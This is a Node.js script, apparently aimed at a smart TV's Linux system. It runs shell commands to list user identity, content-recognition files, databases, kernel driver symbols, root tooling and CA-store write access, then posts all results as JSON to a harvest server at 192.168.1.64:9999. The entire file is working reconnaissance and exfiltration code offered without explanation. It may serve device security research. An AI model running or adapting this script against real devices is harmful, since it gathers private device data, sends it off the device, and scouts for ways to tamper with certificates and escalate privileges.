"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 45000 }).slice(0, 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.id = sh("id");
out.acr_find = sh("find /opt /mnt /dtv /mtd_rwarea /mtd_rocommon -iname '*acr*' 2>/dev/null | head -30");
out.dbspace = sh("ls -laR /opt/dbspace 2>/dev/null | head -120");
out.db_find = sh("find /opt/dbspace /opt/usr /opt/var -name '*.db' 2>/dev/null | head -50");
post("/harvest1", out);

var out2 = {};
out2.ko_find = sh("cat /proc/kallsyms 2>/dev/null | grep -iE 'ker_sys|ntksys' | head -10; echo ===; find / -name 'ntkdriver*' -o -name 'ker_sys*' 2>/dev/null | head -8");
out2.ca_store = sh("ls -la /opt/var/lib/ca-certificates/ /opt/etc/ssl/certs/ 2>&1 | head -30; echo ===; [ -w /opt/var/lib/ca-certificates/ca-bundle.pem ] && echo CA_WRITABLE || echo CA_RO");
out2.root_tools = sh("dmesg 2>/dev/null | head -12; echo ===; ls -la /usr/sbin/vd-tcpdump /usr/sbin/dlogutil /usr/bin/capsh 2>&1; echo ===; cat /proc/cmdline");
post("/harvest2", out2);
